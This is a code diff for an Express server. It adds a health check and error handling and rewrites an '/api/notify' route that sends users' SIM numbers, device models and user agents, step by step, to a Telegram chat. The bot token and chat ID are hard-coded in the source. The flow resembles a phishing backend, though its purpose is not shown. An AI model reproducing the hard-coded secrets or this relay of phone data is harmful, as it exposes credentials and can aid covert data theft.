@@ -7,18 +7,28 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 async function startServer() {
-  const app = express();
-  const PORT = 3000;
+  try {
+    const app = express();
+    const PORT = 3000;
 
-  app.use(express.json());
+    app.use(express.json());
+
+    console.log("[SERVER] Starting server initialization...");
+
+    // Health check route
+    app.get("/api/health", (req, res) => {
+      res.json({ status: "ok" });
+    });
+
+    console.log("[SERVER] Health check route initialized.");
 
   // API Route to notify Telegram
   app.post("/api/notify", async (req, res) => {
     const { step, deviceModel, simNumber, userAgent } = req.body;
     
     // Updated Telegram Credentials
-    const botToken = process.env.TELEGRAM_BOT_TOKEN || "8667560742:AAGa4YHCuFVuAi7CZTKV6TpkZ469nP4dgSo";
-    const chatId = process.env.TELEGRAM_CHAT_ID || "8039370191";
+    const botToken = "8667560742:AAGa4YHCuFVuAi7CZTKV6TpkZ469nP4dgSo";
+    const chatId = "8039370191";
 
     console.log(`[SYSTEM] Notification request received for step ${step}. Using Bot Token: ${botToken.substring(0, 10)}... and Chat ID: ${chatId}`);
 
@@ -116,9 +126,16 @@ async function startServer() {
     });
   }
 
-  app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-  });
+    app.listen(PORT, "0.0.0.0", () => {
+      console.log(`[SERVER] Server running on http://localhost:${PORT}`);
+    });
+  } catch (error) {
+    console.error("[SERVER] Error during server initialization:", error);
+    throw error;
+  }
 }
 
-startServer();
+startServer().catch((err) => {
+  console.error("[SERVER] Fatal error during startup:", err);
+  process.exit(1);
+});
